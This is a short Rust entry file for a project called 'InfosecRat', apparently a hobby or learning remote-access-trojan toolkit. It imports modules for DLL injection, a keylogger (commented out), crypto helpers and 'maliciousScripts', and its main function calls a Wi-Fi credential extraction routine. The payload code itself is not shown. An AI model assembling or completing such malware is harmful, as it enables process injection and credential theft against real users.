// mod keylogger;
mod helper_fns;
mod dllinjection;
mod BasicCryptoAlgos;
mod maliciousScripts;


// use keylogger::keylogger::keylog;
// use helper_fns::mem_alloc::mem_alloc;
use dllinjection::injector::inject_dll;
use std::env::args;
use std::process::exit;
// use BasicCryptoAlgos::aes_exec::aes_execute;
// use BasicCryptoAlgos::xor_cipher;
use maliciousScripts::wifi_hack::wifi_ext;


fn main(){
    let cmd_args: Vec<String> = args().collect();
    //The collect function or method gives us the collected set of any iterable struct converted to another type just like join in python
    if cmd_args.len()<=2{
        eprintln!("Usage ./InfosecRat.exe <processWindowName> <dllPath>");
        exit(0);
    }
    // inject_dll(&cmd_args[1],&cmd_args[2]);
    wifi_ext();
}